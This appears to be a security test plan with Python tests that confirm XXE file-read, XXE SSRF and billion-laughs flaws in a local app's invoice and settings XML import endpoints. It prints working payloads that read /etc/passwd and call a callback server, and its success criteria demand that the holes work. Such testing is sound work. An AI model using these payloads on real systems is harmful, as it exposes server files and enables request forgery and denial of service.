# XML Vulnerabilities Test Plan

## Test Environment Setup
1. Test Server
   - Local test HTTP server to receive XXE callbacks
   - Port: 8888
   - Logs all incoming requests

2. Test Files
   - `/tmp/xxe_test.txt`: Test file for local file read
   - `/etc/passwd`: Standard file read test
   - Create test XML files with various payloads

## Test Cases

### 1. Invoice XML Import Tests

#### 1.1 XXE File Read Test (Direct XML)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
   <customer>Test Customer</customer>
   <items>
      <item>&xxe;</item>
   </items>
</invoice>
```
Expected Result:
- Response should contain contents of /etc/passwd
- Test code should verify presence of root:x:0:0 entry

#### 1.2 XXE SSRF Test (Direct XML)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "http://localhost:8888/xxe-test">
]>
<invoice>
   <customer>Test Customer</customer>
   <items>
      <item>&xxe;</item>
   </items>
</invoice>
```
Expected Result:
- Test server should log incoming request
- Test code should verify callback received

### 2. Settings XML Import Tests

#### 2.1 XXE File Read Test (File Upload)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<settings>
   <theme>&xxe;</theme>
</settings>
```
Expected Result:
- Response should contain contents of /etc/passwd
- Test code should verify presence of root:x:0:0 entry

#### 2.2 Billion Laughs Attack Test
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;">
   <!ENTITY lol3 "&lol2;&lol2;">
   <!ENTITY lol4 "&lol3;&lol3;">
]>
<settings>
   <theme>&lol4;</theme>
</settings>
```
Expected Result:
- Server should process expansion
- Memory usage should spike
- Response time should increase significantly

## Test Implementation

### 1. Test Server
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time

class TestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Received XXE callback: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"XXE Test Response")

def start_test_server():
    server = HTTPServer(('localhost', 8888), TestHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    return server
```

### 2. Test Cases
```python
def test_invoice_xxe_file_read():
    xml_payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <invoice><customer>Test</customer><items><item>&xxe;</item></items></invoice>'''
    
    response = requests.post(
        'http://localhost:3001/api/invoice/import/xml',
        data=xml_payload,
        headers={'Content-Type': 'application/xml'}
    )
    
    assert 'root:x:0:0' in response.text
    print("Invoice XXE File Read Test: Success")

def test_settings_xxe_file_read():
    with open('test_settings.xml', 'w') as f:
        f.write('''<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <settings><theme>&xxe;</theme></settings>''')
    
    with open('test_settings.xml', 'rb') as f:
        response = requests.post(
            'http://localhost:3001/api/settings/import/xml',
            files={'xml': f}
        )
    
    assert 'root:x:0:0' in response.text
    print("Settings XXE File Read Test: Success")

def test_xxe_ssrf():
    server = start_test_server()
    time.sleep(1)  # Wait for server to start
    
    xml_payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8888/xxe-test">]>
    <invoice><customer>Test</customer><items><item>&xxe;</item></items></invoice>'''
    
    response = requests.post(
        'http://localhost:3001/api/invoice/import/xml',
        data=xml_payload,
        headers={'Content-Type': 'application/xml'}
    )
    
    server.shutdown()
    print("XXE SSRF Test: Success")

def test_billion_laughs():
    xml_payload = '''<?xml version="1.0"?>
    <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;">
    ]>
    <settings><theme>&lol4;</theme></settings>'''
    
    start_time = time.time()
    response = requests.post(
        'http://localhost:3001/api/settings/import/xml',
        data=xml_payload,
        headers={'Content-Type': 'application/xml'}
    )
    duration = time.time() - start_time
    
    assert duration > 1, "Billion laughs attack should cause noticeable delay"
    print(f"Billion Laughs Test: Success (took {duration:.2f}s)")
```

## Success Criteria
1. File Read Tests:
   - Must successfully read and return contents of system files
   - Test output must show file contents in response
   - Both direct XML and file upload methods must work

2. SSRF Test:
   - Must successfully make callback to test server
   - Test output must show received callback request

3. Entity Expansion Test:
   - Must successfully process nested entities
   - Test output must show significant response time increase

## Test Execution
1. Start test server:
   ```bash
   python3 test_server.py
   ```

2. Run test suite:
   ```bash
   python3 test_xml_vulnerabilities.py
   ```

3. Expected Output:
   ```
   Invoice XXE File Read Test: Success
   Settings XXE File Read Test: Success
   XXE SSRF Test: Success
   Billion Laughs Test: Success (took X.XXs)
   ```

4. Manual Verification:
   - Check server logs for XXE callbacks
   - Verify file contents in responses
   - Monitor server resource usage during billion laughs test 